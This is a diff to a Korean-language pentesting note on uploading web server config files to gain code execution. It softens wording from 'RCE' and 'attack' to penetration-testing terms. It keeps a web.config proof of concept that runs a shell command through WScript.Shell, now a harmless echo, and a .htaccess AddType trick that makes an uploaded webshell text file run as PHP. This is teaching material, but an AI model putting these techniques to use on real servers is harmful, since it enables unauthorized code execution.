@@ -108,9 +108,9 @@ LoadModule php_module /usr/lib/apache2/modules/libphp.so
     AddType application/x-httpd-php .php
 ```
 
-이러한 설정 파일 같이 여러 config파일들을 업로드해서 웹서버가 파일을 실행시키거나 config 파일 자체에서 악성 코드를 실행 시킬수 있게도 할 수 있습니다.
+이러한 설정 파일 같이 여러 config파일들을 업로드해서 웹서버가 파일을 실행시키거나 config 파일 자체에서 코드를 실행 시킬수 있게도 할 수 있습니다.
 
-### web.config RCE
+### web.config CE example:
 
 Proof of Concept:
 
@@ -138,7 +138,7 @@ Proof of Concept:
 Response.write("-"&"->")
 ' it is running the ASP code if you can see 3 by opening the web.config file!
 Dim oShell, sCommand
-sCommand = ""
+sCommand = "echo 'Hello Test'"
 Set oShell = Server.CreateObject("WScript.Shell")
 oShell.Run sCommand, , True
 Set oShell = Nothing
@@ -146,9 +146,9 @@ Response.write("<!-"&"-")
 %>
 -->
 ```
-### .htaccess RCE 
+### .htaccess CE 
 
-`.htaccess` 는 아파치 웹 서버 디렉토리를 설정하는 기본적인 파일입니다. 만약 웹서버에 `.htaccess`를 Override 할 수 있다면, 다음과 같은 공격들을 수행 할수 있습니다.
+`.htaccess` 는 아파치 웹 서버 디렉토리를 설정하는 기본적인 파일입니다. 만약 웹서버에 `.htaccess`를 Override 할 수 있다면, 다음과 같은 침투테스팅들을 수행 할수 있습니다.
 
 1. `AddType application/x-httpd-php .txt`를 `.htaccess` 파일을 올려 덮어씌운다음 `webshell.txt`등으로 `txt`파일을 업로드 하였지만 php로 실행시킬수 있을것 입니다.
 
